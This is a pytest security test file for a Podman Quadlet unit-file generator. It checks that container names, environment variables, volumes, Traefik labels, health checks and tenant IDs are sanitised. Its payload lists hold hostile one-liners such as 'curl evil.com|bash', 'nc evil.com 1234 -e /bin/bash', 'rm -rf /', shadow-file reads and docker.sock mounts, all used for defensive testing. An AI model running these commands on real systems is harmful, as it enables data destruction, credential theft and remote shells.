"""Security tests for Podman Quadlet deployment.

Tests for various injection attacks and security vulnerabilities:
- Container name injection
- Environment variable injection
- Volume mount path traversal
- Traefik label injection
- Systemd unit file injection
- Command injection
- YAML/INI injection
- Tenant isolation bypass
"""

import re
import sys
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from pactown.deploy.quadlet import (
    QuadletConfig,
    QuadletTemplates,
    QuadletUnit,
)


class TestContainerNameInjection:
    """Test container name sanitization against injection attacks."""

    MALICIOUS_NAMES = [
        # Command injection
        "test; rm -rf /",
        "test && cat /etc/passwd",
        "test | nc attacker.com 1234",
        "$(whoami)",
        "`id`",
        "test\nExecStart=/bin/bash",

        # Path traversal
        "../../../etc/passwd",
        "..\\..\\windows\\system32",
        "test/../../root",

        # Null byte injection
        "test\x00.container",
        "test\x00rm -rf /",

        # Unicode tricks
        "test\u202e\u0065\u0078\u0065",  # Right-to-left override
        "tëst",  # Non-ASCII

        # Newline injection (INI format)
        "test\n[Service]\nExecStart=/bin/bash -c 'curl attacker.com | bash'",
        "test\r\n[Install]\nWantedBy=multi-user.target",

        # Special characters
        "test;echo pwned",
        "test'--",
        'test"--',
        "test`id`",
        "test$(cat /etc/shadow)",
    ]

    def test_container_name_sanitization(self):
        """Ensure malicious container names are sanitized."""
        config = QuadletConfig(tenant_id="test", domain="example.com")

        for malicious_name in self.MALICIOUS_NAMES:
            unit = QuadletTemplates.container(
                name=malicious_name,
                image="nginx:latest",
                port=8080,
                config=config,
            )

            # Container name should only contain safe characters
            # Extract ContainerName from content
            match = re.search(r'ContainerName=(.+)', unit.content)
            if match:
                container_name = match.group(1)
                # Should not contain dangerous characters
                assert ';' not in container_name, f"Semicolon in name: {container_name}"
                assert '|' not in container_name, f"Pipe in name: {container_name}"
                assert '`' not in container_name, f"Backtick in name: {container_name}"
                assert '$(' not in container_name, f"Command substitution in name: {container_name}"
                assert '\n' not in container_name, f"Newline in name: {container_name}"
                assert '\r' not in container_name, f"Carriage return in name: {container_name}"
                assert '\x00' not in container_name, f"Null byte in name: {container_name}"

    def test_filename_sanitization(self):
        """Ensure unit filenames are safe."""
        for malicious_name in self.MALICIOUS_NAMES:
            unit = QuadletUnit(
                name=malicious_name,
                unit_type="container",
                content="[Container]\nImage=nginx",
            )

            filename = unit.filename
            # Filename should not contain path separators or dangerous chars
            assert '/' not in filename or malicious_name in filename, f"Path separator in: {filename}"
            assert '\x00' not in filename, f"Null byte in filename: {filename}"


class TestEnvironmentVariableInjection:
    """Test environment variable injection attacks."""

    MALICIOUS_ENV = {
        # Command injection via env
        "PATH": "/tmp/evil:$PATH",
        "LD_PRELOAD": "/tmp/evil.so",
        "LD_LIBRARY_PATH": "/tmp/evil",

        # Newline injection
        "NORMAL": "value\nExecStart=/bin/bash",
        "INJECT": "value\n[Service]\nExecStartPre=/bin/bash -c 'curl evil.com|bash'",

        # Shell expansion
        "CMD": "$(cat /etc/passwd)",
        "CMD2": "`whoami`",
        "CMD3": "${HOME}/../../../etc/passwd",

        # Quote escaping
        "QUOTE": "value'; rm -rf /; echo '",
        "DQUOTE": 'value"; cat /etc/shadow; echo "',

        # Special systemd characters
        "PERCENT": "%n %i %u",  # systemd specifiers
        "DOLLAR": "$$PATH",  # shell variable
    }

    def test_env_value_sanitization(self):
        """Ensure environment values are properly escaped."""
        config = QuadletConfig(tenant_id="test", domain="example.com")

        unit = QuadletTemplates.container(
            name="test-service",
            image="nginx:latest",
            port=8080,
            config=config,
            env=self.MALICIOUS_ENV,
        )

        content = unit.content

        # Check that newlines in env values don't create new sections
        assert content.count("[Service]") == 1, "Multiple [Service] sections found"
        assert content.count("[Install]") == 1, "Multiple [Install] sections found"
        assert content.count("[Container]") == 1, "Multiple [Container] sections found"

        # Dangerous commands should not appear outside Environment= lines
        lines = content.split('\n')
        for i, line in enumerate(lines):
            if not line.startswith("Environment="):
                assert "ExecStart=/bin/bash" not in line or "ExecStart" in lines[0], \
                    f"Injected ExecStart at line {i}: {line}"
                assert "curl evil" not in line.lower(), f"Injected curl at line {i}"

    def test_env_key_sanitization(self):
        """Ensure environment keys are sanitized."""
        malicious_keys = {
            "NORMAL=injected\nExecStart": "value",
            "KEY\nExecStart=/bin/bash": "value",
            "KEY;rm -rf /": "value",
        }

        config = QuadletConfig(tenant_id="test", domain="example.com")

        unit = QuadletTemplates.container(
            name="test",
            image="nginx",
            port=8080,
            config=config,
            env=malicious_keys,
        )

        # Should not have multiple ExecStart or dangerous commands
        assert unit.content.count("ExecStart") <= 1 or "# " in unit.content


class TestVolumeMountInjection:
    """Test volume mount path traversal and injection."""

    MALICIOUS_VOLUMES = [
        # Path traversal
        "../../../etc/passwd:/etc/passwd",
        "/etc/shadow:/app/shadow:ro",
        "../../../../root/.ssh:/app/ssh",

        # Symlink attacks (would need runtime test)
        "/tmp/symlink_to_etc:/app/etc",

        # Special mounts
        "/proc:/app/proc",
        "/sys:/app/sys",
        "/dev:/app/dev",

        # Docker socket (container escape)
        "/var/run/docker.sock:/var/run/docker.sock",
        "/run/podman/podman.sock:/var/run/docker.sock",

        # Injection via volume spec
        "/app:/app\nExecStart=/bin/bash",
        "/app:/app;rm -rf /",
    ]

    def test_volume_path_validation(self):
        """Test that dangerous volume mounts are detected and blocked."""
        config = QuadletConfig(tenant_id="test", domain="example.com")

        for vol in self.MALICIOUS_VOLUMES:
            unit = QuadletTemplates.container(
                name="test",
                image="nginx",
                port=8080,
                config=config,
                volumes=[vol],
            )

            content = unit.content

            # Newline injection should not work
            assert content.count("[Container]") == 1, f"Multiple [Container] sections for: {vol}"
            assert "ExecStart=/bin/bash" not in content, f"ExecStart injected via: {vol}"

            # Dangerous mounts should be blocked (not appear in output)
            if "/etc/shadow" in vol:
                assert "/etc/shadow" not in content, f"Shadow file mount not blocked: {vol}"
            if "/proc" in vol and ":/app/proc" in vol:
                assert "/proc:/app/proc" not in content, f"Proc mount not blocked: {vol}"
            if "docker.sock" in vol:
                assert "docker.sock" not in content, f"Docker socket mount not blocked: {vol}"

    def test_volume_options_injection(self):
        """Test injection via volume mount options."""
        malicious_options = [
            "/app:/app:rw,exec\nExecStart=/bin/bash",
            "/app:/app:Z,suid",  # SELinux relabel + suid
        ]

        config = QuadletConfig(tenant_id="test", domain="example.com")

        for vol in malicious_options:
            unit = QuadletTemplates.container(
                name="test",
                image="nginx",
                port=8080,
                config=config,
                volumes=[vol],
            )

            # Should not inject new directives
            lines = [line for line in unit.content.split('\n') if line.strip() and not line.startswith('#')]
            exec_lines = [line for line in lines if line.startswith('ExecStart') and '/bin/bash' in line]
            assert len(exec_lines) == 0, f"Injected ExecStart: {exec_lines}"


class TestTraefikLabelInjection:
    """Test Traefik routing label injection attacks."""

    def test_domain_injection(self):
        """Test domain name injection in Traefik labels."""
        malicious_domains = [
            "evil.com`) || Host(`admin.legit.com",
            "test.com' OR '1'='1",
            "test.com\nLabel=traefik.http.routers.admin.rule=PathPrefix(`/admin`)",
            "${jndi:ldap://evil.com/a}",  # Log4j style
            "test.com`))&& PathPrefix(`/admin",
        ]

        for domain in malicious_domains:
            config = QuadletConfig(
                tenant_id="test",
                domain="legit.com",
                subdomain=domain,  # Inject via subdomain
                traefik_enabled=True,
            )

            unit = QuadletTemplates.container(
                name="test",
                image="nginx",
                port=8080,
                config=config,
            )

            content = unit.content

            # Dangerous characters should be stripped from domain
            # Backticks, parentheses, pipes should not appear in Host() rule
            host_matches = re.findall(r"Host\(`([^`]+)`\)", content)
            for host in host_matches:
                assert '`' not in host, f"Backtick in host: {host}"
                assert '(' not in host, f"Parenthesis in host: {host}"
                assert '|' not in host, f"Pipe in host: {host}"
                assert '\n' not in host, f"Newline in host: {host}"

            # Newline injection should not create new Label lines
            assert "PathPrefix(`/admin`)" not in content, f"PathPrefix injected via: {domain}"

    def test_middleware_injection(self):
        """Test Traefik middleware injection."""
        config = QuadletConfig(
            tenant_id="test",
            domain="example.com",
            traefik_enabled=True,
        )

        # Try to inject via service name
        malicious_names = [
            "test\nLabel=traefik.http.middlewares.auth.basicauth.users=admin:$apr1$xxx",
            "test`))Label=traefik.http.routers.test.middlewares=strip",
        ]

        for name in malicious_names:
            unit = QuadletTemplates.container(
                name=name,
                image="nginx",
                port=8080,
                config=config,
            )

            # Should not inject auth bypass
            assert "basicauth" not in unit.content.lower() or "test" in unit.content


class TestSystemdUnitInjection:
    """Test systemd unit file injection attacks."""

    def test_section_injection(self):
        """Test injection of new systemd sections."""
        config = QuadletConfig(tenant_id="test", domain="example.com")

        # Try to inject via various fields
        injections = [
            ("name", "test\n\n[Service]\nExecStartPre=/bin/bash -c 'curl evil|bash'"),
            ("name", "test\n[Install]\nAlias=sshd.service"),
            ("image", "nginx\n[Socket]\nListenStream=/run/evil.sock"),
        ]

        for field, value in injections:
            if field == "name":
                unit = QuadletTemplates.container(
                    name=value,
                    image="nginx",
                    port=8080,
                    config=config,
                )
            else:
                unit = QuadletTemplates.container(
                    name="test",
                    image=value,
                    port=8080,
                    config=config,
                )

            content = unit.content

            # Count sections - should only have expected ones
            sections = re.findall(r'^\[(\w+)\]', content, re.MULTILINE)
            expected = {'Unit', 'Container', 'Service', 'Install'}
            unexpected = set(sections) - expected
            assert not unexpected, f"Unexpected sections injected: {unexpected}"

            # Should not have ExecStartPre with curl
            assert "curl evil" not in content.lower()

    def test_directive_injection(self):
        """Test injection of dangerous systemd directives."""
        dangerous_directives = [
            "ExecStartPre=/bin/bash",
            "ExecStopPost=rm -rf /",
            "ExecReload=curl evil.com",
            "BindPaths=/etc:/mnt/etc",
            "RootDirectory=/",
            "PrivateUsers=false",
        ]

        config = QuadletConfig(tenant_id="test", domain="example.com")

        for directive in dangerous_directives:
            # Try to inject via name
            unit = QuadletTemplates.container(
                name=f"test\n{directive}",
                image="nginx",
                port=8080,
                config=config,
            )

            # Directive should not appear as a standalone line
            lines = unit.content.split('\n')
            for line in lines:
                if line.strip() == directive:
                    pytest.fail(f"Dangerous directive injected: {directive}")


class TestTenantIsolation:
    """Test tenant isolation and privilege escalation."""

    def test_tenant_path_traversal(self):
        """Test that tenants cannot access other tenant directories."""
        malicious_tenants = [
            "../other-tenant",
            "../../root",
            "tenant1/../tenant2",
            "..\\..\\windows",
            "tenant\x00/../admin",
        ]

        for tenant_id in malicious_tenants:
            config = QuadletConfig(tenant_id=tenant_id, domain="example.com")

            # Generate a container to test full flow
            unit = QuadletTemplates.container(
                name="test",
                image="nginx",
                port=8080,
                config=config,
            )

            # Content should have sanitized tenant name
            content = unit.content

            # Path traversal should not appear in container name
            assert "../" not in content, f"Path traversal in content for: {tenant_id}"
            assert "..\\" not in content, f"Windows path traversal in content for: {tenant_id}"
            assert "\x00" not in content, f"Null byte in content for: {tenant_id}"

            # Container name should be sanitized
            container_match = re.search(r'ContainerName=(.+)', content)
            if container_match:
                container_name = container_match.group(1)
                assert ".." not in container_name, f"Path traversal in container name: {container_name}"

    def test_tenant_network_isolation(self):
        """Test that tenants cannot access other tenant networks."""
        config = QuadletConfig(tenant_id="tenant1", domain="example.com")

        # Try to specify another tenant's network
        unit = QuadletTemplates.container(
            name="test",
            image="nginx",
            port=8080,
            config=config,
        )

        # Network should be tenant-scoped or global, not other tenant's
        assert "tenant2" not in unit.content or "tenant1" in unit.content


class TestCommandInjection:
    """Test command injection via various vectors."""

    def test_health_check_injection(self):
        """Test injection via health check endpoint."""
        malicious_endpoints = [
            "/health; cat /etc/passwd",
            "/health && rm -rf /",
            "/health | nc evil.com 1234 -e /bin/bash",
            "/health`id`",
            "/health$(whoami)",
            "/health\nExecStart=/bin/bash",
        ]

        config = QuadletConfig(tenant_id="test", domain="example.com")

        for endpoint in malicious_endpoints:
            unit = QuadletTemplates.container(
                name="test",
                image="nginx",
                port=8080,
                config=config,
                health_check=endpoint,
            )

            content = unit.content

            # Commands should be properly quoted/escaped
            # Should not execute arbitrary commands
            if "HealthCmd" in content:
                health_line = [ln for ln in content.split('\n') if 'HealthCmd' in ln][0]
                # Dangerous patterns should be escaped or rejected
                assert "; cat" not in health_line or "curl" in health_line
                assert "&& rm" not in health_line

    def test_image_name_injection(self):
        """Test injection via container image name."""
        malicious_images = [
            "nginx; rm -rf /",
            "nginx\nExecStart=/bin/bash",
            "$(curl evil.com/malware.sh | bash)",
            "nginx`id`",
            "evil.com/nginx:latest --privileged",
        ]

        config = QuadletConfig(tenant_id="test", domain="example.com")

        for image in malicious_images:
            unit = QuadletTemplates.container(
                name="test",
                image=image,
                port=8080,
                config=config,
            )

            content = unit.content

            # Should only have one Image= line
            image_lines = [ln for ln in content.split('\n') if ln.startswith('Image=')]
            assert len(image_lines) == 1

            # Should not inject commands
            assert "ExecStart=/bin/bash" not in content or "Image=" in content


class TestAPISecurityInjection:
    """Test API endpoint security against injection."""

    @pytest.fixture
    def api_client(self):
        """Create test client for API."""
        from fastapi.testclient import TestClient

        from pactown.deploy.quadlet_api import create_quadlet_api

        app = create_quadlet_api(default_domain="test.com")
        return TestClient(app)

    def test_markdown_content_injection(self, api_client):
        """Test injection via markdown content."""
        malicious_contents = [
            "# Test\n```python main.py\nimport os; os.system('rm -rf /')\n```",
            "# Test\n\n[Unit]\nExecStart=/bin/bash",
            "# Test ${jndi:ldap://evil.com}",
        ]

        for content in malicious_contents:
            response = api_client.post("/generate/markdown", json={
                "markdown_content": content,
                "tenant_id": "test",
                "domain": "test.com",
            })

            # Should succeed but content should be contained
            if response.status_code == 200:
                data = response.json()
                for file in data.get("files", []):
                    file_content = file.get("content", "")
                    # Malicious commands should not appear in unit file
                    assert "rm -rf /" not in file_content or "Environment" in file_content

    def test_tenant_id_injection(self, api_client):
        """Test injection via tenant_id parameter."""
        malicious_tenants = [
            "../../../etc",
            "test; rm -rf /",
            "test\n[Service]\nExecStart=/bin/bash",
        ]

        for tenant_id in malicious_tenants:
            response = api_client.post("/generate/container", json={
                "name": "test",
                "image": "nginx",
                "port": 8080,
                "tenant_id": tenant_id,
                "domain": "test.com",
            })

            if response.status_code == 200:
                data = response.json()
                # Path should not escape
                tenant_path = data.get("tenant_path", "")
                assert "/etc" not in tenant_path or "containers" in tenant_path


class TestSecurityHardening:
    """Test that security hardening options are properly applied."""

    def test_no_new_privileges(self):
        """Ensure no-new-privileges is set."""
        config = QuadletConfig(tenant_id="test", domain="example.com")

        unit = QuadletTemplates.container(
            name="test",
            image="nginx",
            port=8080,
            config=config,
        )

        assert "no-new-privileges" in unit.content.lower()

    def test_capability_drop(self):
        """Ensure capabilities are dropped by default."""
        config = QuadletConfig(tenant_id="test", domain="example.com")

        unit = QuadletTemplates.container(
            name="test",
            image="nginx",
            port=8080,
            config=config,
        )

        # Should have security options
        assert "security-opt" in unit.content.lower() or "Security" in unit.content

    def test_resource_limits(self):
        """Ensure resource limits are set."""
        config = QuadletConfig(
            tenant_id="test",
            domain="example.com",
            cpus="0.5",
            memory="256M",
        )

        unit = QuadletTemplates.container(
            name="test",
            image="nginx",
            port=8080,
            config=config,
        )

        assert "--cpus" in unit.content or "cpus" in unit.content.lower()
        assert "--memory" in unit.content or "memory" in unit.content.lower()

    def test_read_only_filesystem(self):
        """Test read-only filesystem option."""
        # This should be configurable
        config = QuadletConfig(tenant_id="test", domain="example.com")

        unit = QuadletTemplates.container(
            name="test",
            image="nginx",
            port=8080,
            config=config,
        )

        # Production containers should have read-only or tmpfs
        content = unit.content.lower()
        # At minimum should have security hardening
        assert "security" in content or "podmanargs" in content


class TestInputSanitization:
    """Test input sanitization functions."""

    def test_sanitize_name(self):
        """Test name sanitization function."""
        test_cases = [
            ("valid-name", True),
            ("valid_name", True),
            ("valid123", True),
            ("UPPER", True),
            ("with space", False),
            ("with;semicolon", False),
            ("with|pipe", False),
            ("with`backtick", False),
            ("with$dollar", False),
            ("with\nnewline", False),
            ("with\x00null", False),
        ]

        for name, should_be_safe in test_cases:
            # Check if name contains only safe characters
            is_safe = bool(re.match(r'^[a-zA-Z0-9_-]+$', name))
            if should_be_safe:
                assert is_safe, f"Name should be safe: {name}"
            # Unsafe names should be sanitized when used


# Fixtures and utilities
@pytest.fixture
def temp_dir():
    """Create temporary directory for tests."""
    with tempfile.TemporaryDirectory() as d:
        yield Path(d)


@pytest.fixture
def mock_systemctl():
    """Mock systemctl calls."""
    with patch('subprocess.run') as mock:
        mock.return_value = MagicMock(returncode=0, stdout="", stderr="")
        yield mock


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
